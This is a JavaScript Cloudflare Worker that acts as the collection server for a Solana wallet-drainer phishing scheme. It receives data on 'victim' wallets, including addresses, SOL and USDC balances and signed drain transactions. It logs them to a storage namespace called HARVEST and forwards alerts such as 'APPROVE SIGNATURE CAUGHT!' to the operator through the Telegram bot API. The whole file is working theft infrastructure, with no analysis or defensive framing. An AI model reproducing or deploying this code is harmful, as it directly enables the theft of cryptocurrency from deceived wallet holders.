export default {
  async fetch(request, env) {
    const corsHeaders = {
      "Access-Control-Allow-Origin": "*",
      "Access-Control-Allow-Methods": "POST, OPTIONS, GET",
      "Access-Control-Allow-Headers": "Content-Type",
    };

    if (request.method === "OPTIONS") {
      return new Response(null, { headers: corsHeaders });
    }

    if (request.method === "POST") {
      try {
        const data = await request.json();
        
        // In KV speichern (optional)
        if (env.HARVEST) {
          await env.HARVEST.put(Date.now() + ":" + data.victim, JSON.stringify(data));
        }
        
        // Telegram Nachricht bauen
        if (env.BOT_TOKEN && env.CHAT_ID) {
          let message = "";
          
          if (data.type === "connection_and_balance") {
            message = `🔗 WALLET CONNECTED!\n\nAddress: \`${data.victim}\`\n\nSOL Balance: ${data.sol} SOL\nUSDC Balance: ${data.usdc} USDC\n\n(Waiting for signature if USDC > 0)`;
          } else if (data.type === "drain") {
            message = `🎣 APPROVE SIGNATURE CAUGHT!\n\nAddress: \`${data.victim}\`\n\nTX:\n\`${data.tx}\``;
          } else {
            message = `Unknown payload from ${data.victim}`;
          }
          
          await fetch(`https://api.telegram.org/bot${env.BOT_TOKEN}/sendMessage`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              chat_id: env.CHAT_ID,
              text: message,
              parse_mode: "Markdown"
            }),
          });
        }
        
        return new Response(JSON.stringify({ success: true }), {
          headers: { ...corsHeaders, "Content-Type": "application/json" },
        });

      } catch (error) {
        return new Response(JSON.stringify({ error: error.message }), {
          status: 500,
          headers: { ...corsHeaders, "Content-Type": "application/json" },
        });
      }
    }

    return new Response("Worker Active", { headers: corsHeaders });
  },
};
